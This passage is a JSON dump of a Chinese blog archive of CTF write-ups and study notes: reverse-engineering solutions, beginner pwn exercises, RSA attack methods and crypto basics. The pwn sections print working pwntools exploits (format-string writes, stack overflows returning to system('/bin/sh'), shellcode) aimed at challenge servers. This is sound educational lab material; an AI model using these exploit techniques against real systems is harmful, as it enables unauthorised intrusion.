[0x82,0x71,0xa7,0x7e,0xe6,0x12,0xc8,0x78,0x50,0xcd,0x28,0x49,0xc9,0x5,0x5b,0x7,0xbc,0xcb,0x9c,0x4b,0x87,0x24,0x70,0x7,0xc6,0xe4,0x1a,0xc1,0xe5,0x1b,0x13,0x3c,0x87,0x85,0xde,0xa4,0x77,0xae,0xdb,0x9b,0xb7,0x40,0x11,0x4a,0xc3,0xc,0x1b] print(\u0026#39;\u0026#39;) for i in range(28): print(chr((key[i]^encode[i])^0xc9),end=\u0026#39;\u0026#39;) flag{5tay4wayFr0m8reakp0int}\n","date":"16 June 2020","permalink":"/achieve/2019to2021/gkctf2020%E9%80%86%E5%90%91wp/","section":"archive","summary":"发现GKCTF在buu上面挂了好久，干脆做着玩玩好了","title":"GkCTF2020逆向wp"},{"content":"\rstring： # 格式化字符串漏洞 x64传参规则 抄来的原理 # 原理挺底层的，得认真看看 https://blog.csdn.net/qq_43394612/article/details/84900668\nputs(\u0026#34;A voice heard in your mind\u0026#34;); puts(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;); _isoc99_scanf(\u0026#34;%ld\u0026#34;, \u0026amp;address);//利用这个传一个地址进去 puts(\u0026#34;And, you wish is:\u0026#34;); _isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); puts(\u0026#34;Your wish is\u0026#34;); printf(\u0026amp;format); //存在格式化字符串漏洞 可以改变地址内的值 puts(\u0026#34;I hear it, I hear it....\u0026#34;); exp： # from pwn import * context.arch=\u0026#39;amd64\u0026#39; # 明确程序类型不同系统生成的shellcraft.sh()不同 io = process(\u0026#39;./string\u0026#39;) io.recvuntil(\u0026#34;secret[0] is \u0026#34;) addr = int(io.recvuntil(\u0026#34;\\n\u0026#34;)[:-1], 16)# 接收屏幕打印出来的地址 io.sendlineafter(\u0026#34; character\u0026#39;s name be:\u0026#34;,\u0026#39;cxk\u0026#39;) io.sendlineafter(\u0026#34; go?east or up?:\u0026#34;,\u0026#39;east\u0026#39;) io.sendlineafter(\u0026#34;go into there(1), or leave(0)?:\u0026#34;,\u0026#39;1\u0026#39;) io.sendlineafter(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;, str(int(addr)))# 将地址放入栈内 io.sendlineafter(\u0026#34;you wish is:\u0026#34;,\u0026#34;%85c%7$n\u0026#34;) # 改变地址指向的值（即改第8个参数） shellcode = asm(shellcraft.sh())# 将shellcode转成机械码 io.sendlineafter(\u0026#34;USE YOU SPELL\u0026#34;, shellcode) io.interactive() 85c%7$n是改参数的其中一种方法\nCGfsb： # 格式化字符串漏洞 x86传参规则 memset(\u0026amp;s, 0, 0x64u); puts(\u0026#34;please tell me your name:\u0026#34;); read(0, \u0026amp;buf, 10u); puts(\u0026#34;leave your message please:\u0026#34;); fgets(\u0026amp;s, 100, stdin); printf(\u0026#34;hello %s\u0026#34;, \u0026amp;buf);//利用这个把 pwnme pwn掉 puts(\u0026#34;your message is:\u0026#34;); printf(\u0026amp;s); if ( pwnme == 8 ) { puts(\u0026#34;you pwned me, here is your flag:\\n\u0026#34;); system(\u0026#34;cat flag\u0026#34;); } 错误的exp # add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) payload = p32(add) io.sendline(payload) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(b\u0026#39;%8c%2$n\u0026#39;) io.interactive() printf(a)才能用\n正确的exp # from pwn import * io = remote(\u0026#34;220.249.52.133\u0026#34;,35348) add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) io.sendline(\u0026#39;cxk\u0026#39;) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(p32(0x0804A068) + b\u0026#39;%c%10$n\u0026#39;) # 调试一下可以看到这里的数据被原封不动放到了 esp 后面，按照 x86 的规律数一下可以看到 0x0804A068 在第十个参数的位置 ，在这里 p32(0x0804A068) 已经占了4个用于输出的位置还需要4个输出字符才能够将地址指向的参数pwn_me改成8 io.interactive() cgpwn2 # 构造payload打return gets(\u0026amp;s);\n返回函数覆盖为\nexp: # from pwn import * r = remote(\u0026#34;220.249.52.133\u0026#34;, 59988) system=0x08048420 r.recvuntil(\u0026#39;name\u0026#39;) r.sendline(\u0026#34;/bin/sh\u0026#34;) name=0x0804A080 payload = b\u0026#39;a\u0026#39; * (0x26+4) + p32(system)+p32(0)+p32(0x0804A080) # 因为32位函数和参数中间是system的 返回地址用 p32(0)填充 r.sendline(payload) #print(r.recv()) #print(r.recv()) r.interactive() # 0804A024 /bin/sh # 08048320 system int_overflow # 利用小整型（int8）溢出绕过检测点 栈溢出改变程序流程 char *__cdecl check_passwd(char *str) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(str);//v3大于255后溢出 if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Invalid Password\u0026#34;); result = (char *)fflush(stdout); } else { puts(\u0026#34;Success\u0026#34;); fflush(stdout); result = strcpy(\u0026amp;dest, str);//覆盖dest 后的r } return result; exp： # from pwn import * #设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口 r = remote(\u0026#34;220.249.52.133\u0026#34;, 33284) system=0x0804868B r.sendlineafter(\u0026#34;Your choice:\u0026#34;, \u0026#34;1\u0026#34;) r.sendlineafter(\u0026#34;your username:\u0026#34;, \u0026#34;kk\u0026#34;) r.recvuntil(\u0026#34;your passwd:\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x14+4) + p32(system) + 231*b\u0026#39;a\u0026#39; #payload=payload.ljust(259,b\u0026#39;a\u0026#39;) print(len(payload)) r.sendline(payload) r.recv() r.interactive() rip # 栈溢出 玄学问题 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+1h] [rbp-Fh] puts(\u0026#34;please input\u0026#34;); gets((__int64)\u0026amp;s, (__int64)argv);//打这里 puts(\u0026amp;s); puts(\u0026#34;ok,bye!!!\u0026#34;); return 0; } 中间会碰到一个玄学的问题: http://blog.eonew.cn/archives/958\n把源存储器内容值送入目的寄存器,当有m128时, 内存地址必须是16字节对齐的。 XMMWORD旨在表示与m128相同的类型,刚好这里符合第二条。\n就是说payload会导致栈的地址可以不是按0x10对齐的，会导致程序crash掉 这时改变payload的长度是解决方法之一\n直接更改我们的payload长度，在栈溢出的时候栈的地址自然不同，然后将栈地址+1，如果不行的话，就继续增加，最多也就改16次就一定会遇到栈对齐的情况。\nexp # from pwn import* sh=remote(\u0026#34;node3.buuoj.cn\u0026#34;,28364) payload=b\u0026#39;a\u0026#39;*23+p64(0x401016)+p64(0x401186) sh.sendline(payload) sh.interactive() ","date":"12 June 2020","permalink":"/achieve/2019to2021/%E5%87%A0%E4%B8%AA%E6%96%B0%E6%89%8Bpwn/","section":"archive","summary":"string： # 格式化字符串漏洞 x64传参规则 抄来的原理 # 原理挺底层的，得认真看看 https://blog.","title":"新手pwn练习汇总"},{"content":" 太马了。。。。\nrust-flag # 用rust语言编写代码看着很丑,加密流程却意外简单。。。。\n分析 # 拖进ida一顿操作找到输入,再往后面找到输出错误的函数，下断点改流程发现没有输出 right 于是判断判断正误的字符串在之前被载入了要输出的字符串，于是往回找找到了一个大循环。。。。\n给循环下断点发现里面有明显用来判断数据的 cmp 指令，循环次数刚好是 RCTF{ 的长度。。。。\n更改 RCTF{ 为其他字符判断使用了字符串的函数并跟进观察寄存器的变化，成功找到加密flag的位置\n接下来解比较简单了，先从内存中读出加密用的 key，由于提取密文的函数过于奇怪，干脆修改流程把所有密文记下来。\nexp: # l1=[0x39,0x15,0x22,0xf4,0x95,0x70,0xe5,0x91,0x07,0x3d,0x8d,0xce,0x78,0xc2,0x52,0x9d,0xe1,0x8d,0x2e,0x6e] l=[0x6b,0x56,0x76,0xb2,0xee,0x3,0xb1,0xe3,0x62,0x5c,0xe6,0x91,0x1d,0x93,0x27,0xfc,0x8d,0xf8,0x53,0x64,0xd7,0x25,0xee,0xe3,0xc8,0xab,0x93,0x86,0xa5,0xaf,0x8c,0xaf,0x4a,0xde,0x64,0x33,0x5d,0x18] for i in range(len(l1)): print(chr(l1[i]^l[i]),end=\u0026#39;\u0026#39;) RCTF{sTreak_eQualu}\ncipher # 太痛苦了。。。再也不想看这个题了\n先拖到ghidra里面看伪代码大概复原后是这个样子的\ndemo: # //i j为两个char类型的随机数 x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); y = 0; a = (flag2 \u0026gt;\u0026gt; 8) + (flag2 \u0026lt;\u0026lt; 56) + flag1 ^ x; b = (flag1 \u0026gt;\u0026gt; 61) + (flag1 \u0026lt;\u0026lt; 3 ) ^ a; i = 0; while (i \u0026lt; 31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; a = ((a \u0026gt;\u0026gt; 8) + (a \u0026lt;\u0026lt; 56) + b) ^ x; b = ((b \u0026gt;\u0026gt; 61) + (b \u0026lt;\u0026lt; 3)) ^ a; i = i + 1; } 注意 x和 y的变化都是由互相的值引起的，故 x 和 y 最终的状态只有 0x100^0x100种。通过爆破i、j可以得到最终的x、y\n爆破demo： # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (uint64_t i = 0; i \u0026lt;= 0xfff; ++i) { for (uint64_t j = 0; j \u0026lt;= 0xfff; ++j) { uint64_t t; uint64_t b = 0x2a00f82be11d77c1; uint64_t a = 0xc3b171fc23d591f4; uint64_t x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); uint64_t y = 0; int i=0; while (i\u0026lt;31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; i += 1; } uint64_t t1,t2; t1=x; t2=y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; if (t == 0x524354467b) { cout\u0026lt;\u0026lt;hex\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;t1\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl\u0026lt;\u0026lt;\u0026#34;y=\u0026#34;\u0026lt;\u0026lt;t2\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); } } } system(\u0026#34;pause\u0026#34;); return 0; } 得到x、y\nx = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; exp： # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { uint64_t v[10] = { 0x2a00f82be11d77c1, 0xc3b171fc23d591f4, 0x30f11e8bc2885957, 0xd594ab77422feb75, 0xe15d76f0466e98b9, 0xb651fdb55d7736f2, }; for (int j = 0; j \u0026lt; 3; j++) { uint64_t t; uint64_t b = v[j*2]; uint64_t a = v[j * 2+1]; uint64_t x; uint64_t y; int i = 0; x = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; uint64_t t1, t2; t1 = x; t2 = y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; b \u0026lt;\u0026lt; a ; } system(\u0026#34;pause\u0026#34;); return 0; } py dome: # import Crypto.Util.number a=0x524354467b393837363233356533613962643639636662366234613364666364626361373066333035346639317d0a00 a = Crypto.Util.number.long_to_bytes(a) print(a) b\u0026rsquo;RCTF{9876235e3a9bd69cfb6b4a3dfcdbca70f3054f91}\n","date":"7 June 2020","permalink":"/achieve/2019to2021/rctf2020%E5%A4%8D%E7%8E%B0wp/","section":"archive","summary":"太马了。。。。","title":"Rctf2020复现wp"},{"content":" 持续更新\n\\; 要写成 \\\\; \\\\[2ex] 要写成\\\\\\\\[2ex] * 星号周围空格 ","date":"6 June 2020","permalink":"/achieve/2019to2021/mathjax%E5%B8%B8%E7%94%A8/","section":"archive","summary":"持续更新","title":"MathJax常用符号使用细节"},{"content":" 花了两天看把基础数论过了一遍，看这些东西的时候理解起来快了很多\n基本类型： # 1. \u0026ldquo;老奶奶用脚都会做\u0026quot;的板子题 # 已知e,p,q求d\n$d$ = $e^{-1}$ mod $\\phi(n)$\n2. 已知e,d,n求p,q # 用已知条件易于求出$N$、$\\phi(n)$,则有\n$$\\begin{cases} N = p * q \\\\[2ex] \\phi(n)=(q-1)(p-1) \\end{cases} $$\n联立得\n$$ \\begin{cases} N-\\phi(n)+1=p+q \\\\[2ex] N=p * q \\end{cases} $$\n引入变量 X 建立一元二次方程（或者直接解二元一次）解出p和q\n也不知道为什么有些地方给的办法那么麻烦。。。\n3.低加解密指数攻击 # 已知c和已知e过小就请直接爆破 低加密指数广播攻击-\u0026gt;套用中国剩余定理模板 低解密指数攻击-\u0026gt;脚本梭哈,试了一下不好用 4.共模攻击 # 若有： $gcd(e_1,e_2)=1$ 且 $$ \\begin{cases} C_1\\equiv M^{e_1} mod;n \\\\[2ex] C_2\\equiv M^{e_2} mod;n \\end{cases} $$\n一定有 $s_1 * e_1+s_2 * e_2= 1$,用扩展欧几里得算出 s1 ，s2\n则有 $ \\begin{cases} C_1^{s_1}\\equiv M^{e_1 * s_1} mod;n \\\\[2ex] C_2^{s_2}\\equiv M^{e_2 * s_2} mod;n \\end{cases} \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M^{e_1 * s_1 + e_2 * s_2}mod;n \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M mod;n $\n5.已知dp,dq求解 # 参考 7.5.2 使用中国余数定理快速加解密（CRT）\n6.加密指数过大（e，n接近） # wiener-attack\nwiener脚本\n已知 n,e,d 求 q , p # 比较冷的常规模板 做法比较\u0026hellip;看脸\npaper import random def gcd(a, b): if a \u0026lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k /= 2 y = pow(g, k, n) if y != 1 and gcd(y-1, n) \u0026gt; 1: p = gcd(y-1, n) q = n/p return (p, q) def main(): \u0026#39;\u0026#39;\u0026#39; n= e= d= \u0026#39;\u0026#39;\u0026#39; p, q = getpq(n, e, d) print( \u0026#34;p=\u0026#34;+hex(p)) print( \u0026#34;q=\u0026#34;+hex(q)) if __name__ == \u0026#39;__main__\u0026#39;: main() ","date":"6 June 2020","permalink":"/achieve/2019to2021/ctf%E4%B8%ADrsa%E5%A5%97%E8%B7%AF/","section":"archive","summary":"花了两天看把基础数论过了一遍，看这些东西的时候理解起来快了很多","title":"CTF中RSA套路"},{"content":"\r秘钥生成与正确性 # 算法不再赘述\nRSA秘钥生成 # 选择两个大素数 p ,q 计算 $n$ = $p * q$ 计算 $\\phi$( n ) = $( p - 1 )( q - 1 )$ 选择 e $\\in$ $Z^m$ 且 gcd（m，e）= 1 计算私钥 d 满足 d * e = 1 mod $\\phi$(n) RSA 核心原理 # $C^d$ $\\equiv$ $M^{d * e}$ $\\equiv$ $M$ mod $n$\n细节如下：\n$d * e = 1 + t * \\phi(n)$ $M^{d * e}\\equiv M^{1 + t * \\phi(n)}\\equiv M * M^{t * \\phi(n)}\\equiv 1 * M$ mod $n$ 7.5.2 使用中国余数定理快速加解密（CRT） # 约简基元素 $M$：\n$M_p$ $\\equiv$ $M$ mod $p$\n$M_q$ $\\equiv$ $M$ mod $q$\n计算两个指数并进行列出的指数运算\n两个指数：\n$d_p\\equiv d$ mod $(p-1)$\n$d_q\\equiv d$ mod $(q-1)$\n运算：\n$C_p\\equiv M^{d_p}_p$ mod $p$\n$C_q\\equiv M^{d_q}_q$ mod $q$\n逆向换到问题域：\n$C$ $\\equiv$ $C_p * M_p * q$ + $C_q * M_q * p$ mod $n$\n如果要解密也可以用这种算法快速算出结果\n","date":"5 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt2/","section":"archive","summary":"秘钥生成与正确性 # 算法不再赘述","title":"从零开始的深入浅出密码学day 2"},{"content":" 今天深入了解了一下 RSA 背后的一些数学原理\n1.4.1 模运算 # .2 余数的不唯一性 # 例：\n12 $\\equiv$ 3 mod 9 12 $\\equiv$ 21 mod 9 12 $\\equiv$ -6 mod 9 12、3、21、-6都属于一个整数集 {\u0026hellip;-27,-15,-6,3,12,21\u0026hellip;.} 这个整数集构成一个所谓的等价类\n对于模数9来说还拥有另外 8 个等价类\n{\u0026hellip;.-9 ,0 ,9\u0026hellip;.}\n{\u0026hellip;.-8 ,1 ,10\u0026hellip;.}\n. . .\n{\u0026hellip;.-10 ,-1 ,8\u0026hellip;.}\n对于模运算来说,等价类所以成员的行为相同\n1.4.2 环 # 定义 # 假设整数环 Zm 有以下两部分构成：\n集合 Zm = {0 ,1 ,2 \u0026hellip;. m-1} 两种操作符 +、* 使a 、b $\\in$ Zm,有： a + b $\\equiv$ c mod m\na * b $\\equiv$ d mod m\n环中的逆元 # 一般逆元定义：\n一个可以取消另一给定元素运算的元素\n但在这里，乘法逆元定义为：a * a-1 $\\equiv$ 1 mod m\n故 3 * 9 $\\equiv$ 1 mod 26 中 9 是 3 的逆元\ngcd(a ,m) = 1时 Zm 中 a 的逆元存在（互质）\n6.3.2 扩展欧几里得算法(EEA) # gcd()用熟悉的辗转相除法发介绍了如何求最大公因数, EEA 算法则最终可以求得 Zm 中 a 的逆元 （前提是存在逆元）\n设正整数 r0 ， r1 且 r0\u0026gt;r1\nEAA算法最终可以得到两份参数：\ngcd(r0 ,r1) 返回的最大公因数 gcd(r0 ,r1) = s * r1 + t * r0 中的 t 、s 当 gcd( m , a) = 1 时，有 s * m + t * r1 = 1\n则 s * 0 + t * r1 $\\equiv$ 1 mod m\nt 为 r1 的逆元\n几个基础的函数和定理 # 基础中的基础\n欧拉函数 # 返回 Zm 内与 m 互质的整数的个数\n$\\phi$( m ) = $\\prod_1^n$ ( Pie - Pie-1 )\n例\n$\\phi$( 240 ) = 24 * 3 * 5 = ( 24 - 23 )( 3 - 1 )( 5 - 1 ) = 64\n费马小定理 # ap $\\equiv$ a mod p \u0026ndash;\u0026gt; ap-1 $\\equiv$ 1 mod p\n欧拉定理 # a、m都是整数，且互质，则有: a $\\phi$( m ) $\\equiv$ 1 mod m\n","date":"4 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt1/","section":"archive","summary":"今天深入了解了一下 RSA 背后的一些数学原理","title":"从零开始的深入浅出密码学day 1"},{"content":"\r常见几种： # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) 理论基础： # 收集来的资料里面提到了 反演规则 和 对偶规则\n对于任意一个函数表达式Y，如果把Y中所有的“与”换成“或”，“或”换成“与”；“0”换成“1”，“1”换成“0”；原变量换成反变量，反变量换成原变量，即得到一个新的函数表达式Y非，称Y非为原函数Y的反函数。 对于任何一个逻辑表达式F,如果将式中所有的“·”换成“+”,“+”换成“·”,“0”换成“1”,“1”换成“0”,而变量保持不变就得到表达式F\u0026rsquo;，这个表达式F\u0026rsquo;称为F的对偶式，这一变换方式称为对偶规则。\n以此可见用与、或、非实现异或的方式并不只有上面那几种，只有符合一定的数学原理就可以实现\n等有时间了就去好好研究研究。。。\n","date":"28 May 2020","permalink":"/achieve/2019to2021/%E4%B8%8E%E6%88%96%E9%9D%9E%E8%A1%A8%E7%A4%BA%E5%BC%82%E6%88%96/","section":"archive","summary":"常见几种： # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) 理论基础： # 收集来的资料里面提到了 反演规则 和 对偶规则","title":"用与、或、非表示异或的几种方式"},{"content":" 如果普通用户无法显示先检查$ ~/.zshrc的权限 真-root无法享受zsh 无法正常显示先检查字体是否出错，字体的名称要打开字体才能看见 windows资源管理器访问wsl系统文件夹可能会改变文件权限，最后还得手动改，很烦 别人的前端永远最好看 ","date":"28 May 2020","permalink":"/achieve/2019to2021/wsl%E7%BE%8E%E5%8C%96/","section":"archive","summary":"如果普通用户无法显示先检查$ ~/.","title":"wsl + zsh进行美化时的注意事项"},{"content":" 我就是铁废物了，整场比赛只做出来两个题\nViQinere # exp找不到了。。。orz 总之连接题目给的ip地址，会返回一串密文，分析一下算法就可以回去开开心心写爆破了\nBScript # 因为队友吧win环境搞没了，所以我就先搞了两个pe文件，不得不说出题人真有你的啊。。。从0开始的文件操作了解一下\n把加密flag的文件拆成800多分，分别放到800多个加了upx壳的文件里面\nemmmm，好吧先脱壳\n脱壳demo： # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for(int i=0;i\u0026lt;804;i++) { char x[5]; memset(x, 0, sizeof(x)); itoa(i,x,10); char s[20] = \u0026#34;upx -d BScript/\u0026#34;; strcat( s ,x); char s1[10] = \u0026#34;.exe\u0026#34;; strcat(s, s1); system(s); } //system(s); system(\u0026#34;pause\u0026#34;); } 脱完壳后随便打开几个到ida里面看看，发现不同的文件里面的变量ans或变量key里面放了一小段pe文件的信息\n__main(); puts(\u0026#34;What a easy RE!\u0026#34;); while ( i ) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4 + i); if ( *(\u0026amp;v4 + i) != ans[63 - i] )//ans里面倒序放置64个 byte 的信息 { puts(\u0026#34;Are you a fool?\u0026#34;); exit(0); } --i; 然后在写几个demo对所有pe文件的类型分析一下，发现800个文件只有两种不同的大小，相同大小的文件中放pe文件的信息的位置是一样的\nFILE *fp = NULL; fp = fopen(\u0026#34;BScript\\\\1~804.exe\u0026#34; , \u0026#34;rb\u0026#34;); fseek(fp,0,SEEK_END); int size = ftell(fp);//这样可以得到文大小 cheak(size); 文件大小 pe信息位置 长度 0xBE03 0x1C40 64 逆序 0xBDF1 0x1c20 32 正序 然后继续撸脚本把文件提取出来，先新建一个空的“new”文件在执行以下代码\ndemo: # #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (int i = 0; i \u0026lt; 804; i++) { char fname[20] = \u0026#34;BScript\\\\\u0026#34;; char s[20]; memset(s, 0, sizeof(s)); itoa(i, s, 10); strcat(fname, s); strcat(fname, \u0026#34;.exe\u0026#34;); char s2[100]; memset(s2, 0, sizeof(s2)); FILE *fr = NULL; fr = fopen(fname, \u0026#34;rb\u0026#34;); fseek(fr,0,SEEK_END); int size = ftell(fr); //printf(\u0026#34;%X\u0026#34;,size); if (size == 48643) { fseek(fr, 0x1C40, SEEK_SET); fread(\u0026amp;s2, 1, 0x40, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0x40 - 1; i \u0026gt;= 0; i--) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } else if (size == 48625) { fseek(fr, 0x1C20, SEEK_SET); fread(\u0026amp;s2, 1, 0x20, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0; i \u0026lt; 0x20; i++) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } } system(\u0026#34;pause\u0026#34;); } 原谅弟弟我只会用C语言写文件操作，写的还很丑\n完工后得到 New 拖进ida发现并没有我们苦苦追寻的字符串。。。那就先看看前几个最有希望的函数，果然在前几个函数中发现了我们感兴趣的代码\n在 0x004015C0 处的函数是个标准的base64，交叉引用一下可以小刀输入的位置和判断的位置，进行找一下可以在 0x00401BEE处的函数了找到给密文赋值的语句\n稍微注意一下赋值的地址就可以把密文拼出来了\n0x00401AD7处 int __cdecl fun(int a1) { tab = \u0026#39;Q\u0026#39;; byte_40D041 = \u0026#39;k\u0026#39;; byte_40D042 = \u0026#39;p\u0026#39;; byte_40D043 = \u0026#39;E\u0026#39;; byte_40D044 = \u0026#39;e\u0026#39;; byte_40D045 = \u0026#39;1\u0026#39;; byte_40D046 = \u0026#39;d\u0026#39;; byte_40D047 = \u0026#39;o\u0026#39;; byte_40D048 = \u0026#39;T\u0026#39;; byte_40D049 = \u0026#39;3\u0026#39;; byte_40D04A = \u0026#39;R\u0026#39;; byte_40D04B = \u0026#39;f\u0026#39;; byte_40D04C = \u0026#39;N\u0026#39;; byte_40D04D = \u0026#39;F\u0026#39;; byte_40D04E = \u0026#39;9\u0026#39;; byte_40D04F = \u0026#39;i\u0026#39;; byte_40D050 = \u0026#39;Y\u0026#39;; byte_40D051 = \u0026#39;W\u0026#39;; byte_40D052 = \u0026#39;V\u0026#39;; byte_40D053 = \u0026#39;1\u0026#39;; byte_40D054 = \u0026#39;d\u0026#39;; v1 = sub_401E7C(\u0026#39;2\u0026#39;); v2 = v1; v3 = (_BYTE *)v1; for ( i = 49; i \u0026gt;= 0; --i ) *v3++ = 0; v7 = v2; v5 = sub_401ECC(a1, (int)v3); unk_40E2C0(v7, 41, v5); for ( j = 0; ((int (__cdecl *)(int))dword_407C68[0])(v7) \u0026gt; j; ++j ) ++*(_BYTE *)(j + v7); return v7; } 0x004019FF处 int __usercall fun2@\u0026lt;eax\u0026gt;(int a1@\u0026lt;edx\u0026gt;, int a2, int a3) { f((int)\u0026amp;v4, a1); f_0(a2, a3, (int)\u0026amp;v4); f_1((int)\u0026amp;v4); byte_40D055 = 68; byte_40D056 = 70; byte_40D057 = 109; byte_40D058 = 100; byte_40D059 = 84; byte_40D05A = 70; byte_40D05B = 102; byte_40D05C = 99; byte_40D05D = 50; byte_40D05E = 78; byte_40D05F = 121; byte_40D060 = 98; byte_40D061 = 72; byte_40D062 = 66; byte_40D063 = 48; byte_40D064 = 102; byte_40D065 = 81; byte_40D066 = 65; byte_40D067 = 65; return a2; } 然后就可以撸exp了 不要忘了按出题人的意思把flag转成32位小写md5值\nexp: # import base64 import hashlib l = [\u0026#39;Q\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;1\u0026#39;,\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;A\u0026#39;] s = b\u0026#39;QkpEe1doT3RfNF9iYWV1dDFmdTFfc2NybHB0fQAA\u0026#39; s1 = base64.b64decode(s) print(s1) flag = b\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; #\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; f = hashlib.md5() f.update(flag) print(f.hexdigest()) #e801bcbcc42d3120d910ccc46ae640dd 如果上交buu的话应该是 flag{e801bcbcc42d3120d910ccc46ae640dd}\n以下为复现题目\nBlink: # 